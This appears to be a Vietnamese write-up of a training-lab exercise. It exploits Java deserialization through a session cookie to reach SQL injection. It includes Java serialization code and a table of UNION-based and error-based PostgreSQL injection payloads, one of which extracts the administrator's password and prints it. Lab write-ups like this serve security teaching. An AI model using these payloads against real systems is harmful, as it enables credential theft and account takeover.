## Developing a custom gadget chain for Java deserialization

1. Dựa vào mô tả thì bài này phần input cho khai thác deserialize vẫn là session cookie. Và folder `/backend` tiết lộ 2 class trong proj.
<img width="787" height="233" alt="image" src="https://github.com/user-attachments/assets/abe14b7f-6159-4694-b64d-8fe69b08c805" />

2. Trước tiên thử deserialize data khi đăng nhập với wiener là gì đã.

```java
class Main {
    public static void main(String[] args) throws Exception {
        Object deserializedObject = deserialize("{Serialized data}");
        System.out.println("Deserialized data str: " + deserializedObject.toString());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }


    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```
3. Nhận được lỗi `Exception in thread "main" java.lang.ClassNotFoundException: lab.actions.common.serializable.AccessTokenUser` cho biết class AccessTokenUser không tồn tại.
4. Lấy nội dung class AccessTokenUser bị lộ ở trên cho vào thư mục ``lab.actions.common.serializable``.
<img width="2295" height="1275" alt="image" src="https://github.com/user-attachments/assets/58c92594-6ad3-4329-874d-7f2789edd5a6" />

5. Để lấy được password của admin có thể nghĩ đến phương án SQLI trong ProductTemplate class khi mà id được truyền vào query mà không có sanitize.
6. Giờ ta cần tạo một object ProductTemplate với id khai báo trước.
> Lưu ý: cần đặt class trong package như class gốc ``package data.productcatalog``
7. Gen serialize data với id = 1 
<img width="2550" height="1279" alt="image" src="https://github.com/user-attachments/assets/3d330620-3e92-4b89-b25e-7353cbd86324" />

8. Nhưng gửi thì chỉ nhận được lỗi ``java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser`` - tức là đã inject thành công nhưng nó đang cố ép về kiểu AccessTokenUser vì ở đây có expect kiểu AccessTokenUser.
<img width="2194" height="1015" alt="image" src="https://github.com/user-attachments/assets/bf524e1c-fb56-4f06-9afa-e10bb33862b9" />

9. Có vẻ sẽ là một kiểu blind sqli.

| Payload   | Kết quả    | Giải thích       |
| ------ | ----- | ------- |
| 1' UNION SELECT NULL-- | org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns | Không map số cột của product |
| 1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- | Executed | Bảng product có 8 cột giá trị |
| 1' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users where username='administrator'-- | java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;o109kdeqerh6kc8eacmr&quot;</p>| lấy được password của administrator |

10. Login vào admin và xóa user.
